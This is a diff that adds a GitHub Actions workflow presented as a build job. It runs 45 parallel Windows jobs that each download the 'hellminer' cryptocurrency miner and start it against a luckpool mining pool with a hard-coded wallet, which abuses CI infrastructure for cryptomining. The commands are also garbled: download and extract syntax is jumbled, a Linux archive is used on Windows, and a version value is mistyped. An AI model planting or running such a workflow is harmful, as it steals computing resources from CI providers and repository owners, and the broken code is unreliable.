@@ -1,0 +1,26 @@
+name: Pusing
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: Dalah
+    runs-on: windows-2022
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -OutFile tar xf hellminer_cpu_linux.tar.gz
+    - name: Extract
+      run: Expand-Archive tar xf hellminer_cpu_linux.tar.gz
+    - name: RUNNING
+      run: ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBnvE5PySsdZCBEBbXoWEocrEr1uWq4dJJ -p x --cpu 8 'string command miner seperti pool:port, wallet, threads, '
+    - name: DONE
+      run: exit
